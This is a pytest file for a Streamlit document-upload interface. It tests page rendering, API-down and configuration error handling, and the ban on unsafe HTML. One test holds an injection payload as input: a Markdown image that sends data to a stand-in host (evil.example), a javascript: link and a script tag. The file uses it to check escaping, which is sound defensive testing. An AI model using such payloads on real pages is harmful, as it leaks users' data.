from __future__ import annotations

from pathlib import Path

import pytest
from streamlit.testing.v1 import AppTest

from src.ui import services
from src.ui.errors import ApiUnavailableError, UiConfigError
from src.ui.safe import safe

APP = str(Path(__file__).resolve().parents[2] / "src" / "ui" / "app.py")


class _HealthyClient:
    def check(self) -> None:
        return None


class _DownClient:
    def __init__(self, message: str) -> None:
        self.message = message

    def check(self) -> None:
        raise ApiUnavailableError(self.message)


def _run(monkeypatch: pytest.MonkeyPatch, client) -> AppTest:
    monkeypatch.setattr(services, "get_client", lambda: client)
    return AppTest.from_file(APP, default_timeout=30).run()


def test_the_skeleton_renders_with_a_healthy_api(monkeypatch: pytest.MonkeyPatch) -> None:
    app = _run(monkeypatch, _HealthyClient())
    assert not app.exception
    assert [title.value for title in app.title] == ["📤 Uploader une facture ou un devis"]
    captions = " ".join(caption.value for caption in app.sidebar.caption)
    assert "chiffrées" in captions and "Version" in captions
    assert not app.error


@pytest.mark.parametrize(
    ("page", "title"),
    [
        ("pages/result.py", "Résultat de l'extraction"),
        ("pages/history.py", "Historique des extractions"),
        ("pages/export.py", "Exporter les données"),
    ],
)
def test_every_page_of_the_navigation_renders(
    monkeypatch: pytest.MonkeyPatch, page: str, title: str
) -> None:
    monkeypatch.setattr(services, "get_client", lambda: _HealthyClient())
    app = AppTest.from_file(APP, default_timeout=30).run()
    app.switch_page(page).run()
    assert not app.exception
    assert any(title in heading.value for heading in app.title)


def test_an_unreachable_api_shows_a_message_and_stops_the_page(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    app = _run(monkeypatch, _DownClient("API injoignable : lancez-la avec `make api`."))
    assert not app.exception
    assert len(app.error) == 1 and "make api" in app.error[0].value
    assert [button.label for button in app.button] == ["Réessayer"]
    assert not app.title  # the page itself was not rendered


def test_a_configuration_error_is_shown_not_crashed(monkeypatch: pytest.MonkeyPatch) -> None:
    def broken() -> None:
        raise UiConfigError("API_TOKEN is missing or shorter than 32 characters")

    monkeypatch.setattr(services, "get_client", broken)
    app = AppTest.from_file(APP, default_timeout=30).run()
    assert not app.exception
    # shown escaped ("API\_TOKEN"): Markdown displays it as API_TOKEN
    assert app.error[0].value == safe("API_TOKEN is missing or shorter than 32 characters")


def test_an_error_message_cannot_inject_markdown_into_the_page(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    hostile = "![x](http://evil.example/?d=secret) [a](javascript:alert(1)) <script>x</script>"
    app = _run(monkeypatch, _DownClient(hostile))
    shown = app.error[0].value
    assert shown == safe(hostile)
    assert "![" not in shown.replace("\\!\\[", "") and "<script>" not in shown


def test_the_page_does_not_use_unsafe_html_anywhere() -> None:
    """A rule of the design: no `unsafe_allow_html`, so text can never become markup."""
    sources = list((Path(APP).parent).rglob("*.py"))
    assert sources  # the search actually found the UI files
    for source in sources:
        assert "unsafe_allow_html" not in source.read_text(encoding="utf-8"), source
